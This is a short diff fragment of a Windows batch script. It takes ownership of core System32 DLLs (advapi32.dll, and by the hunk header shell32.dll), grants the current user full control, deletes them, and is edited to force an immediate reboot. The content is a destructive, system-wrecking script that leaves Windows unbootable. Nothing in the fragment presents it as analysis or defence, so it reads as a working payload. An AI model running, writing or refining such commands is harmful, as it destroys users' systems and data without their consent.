@@ -31,4 +31,4 @@ del shell32.dll
 takeown /f "C:\Windows\System32\advapi32.dll"
 icacls "C:\Windows\System32\advapi32.dll" /grant %username%:F
 del advapi32.dll 
-shutdown -r -f 
+shutdown -r -f -t 0
